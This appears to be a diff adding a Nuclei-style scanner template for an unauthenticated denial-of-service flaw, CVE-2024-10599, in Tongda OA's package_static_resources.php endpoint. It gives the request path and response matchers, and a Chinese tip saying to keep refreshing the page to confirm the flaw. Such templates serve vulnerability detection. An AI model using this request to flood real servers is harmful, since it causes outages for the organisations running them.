@@ -1,0 +1,31 @@
+id: tongda-oa-package_static_resources-unauth-dos
+info:
+  name: 通达 OA package_static_resources - unauth dos
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=Mzg2NDg2MDIxNQ==&mid=2247484951&idx=1&sn=0dae3f9deadbe40f81ba47cda779796e&chksm=ce63a74ff9142e5965966711085ed02723ef993a10ec1ffc595a43082b6074eb3e5445a71977&cur_album_id=3708659952727343111&scene=189#wechat_redirect
+  classification:
+    cve-id: CVE-2024-10599
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 一直怼着页面刷，旁边放 index ，也进行刷新，即可验证
+    repair:
+    version: v2017-v11.7
+  tags: 2024,dos,uanuth,tongda,oa
+
+http:
+  - raw:
+      - |
+        GET /inc/package_static_resources.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'读取','写入','打包成功','tD')
+        condition: and
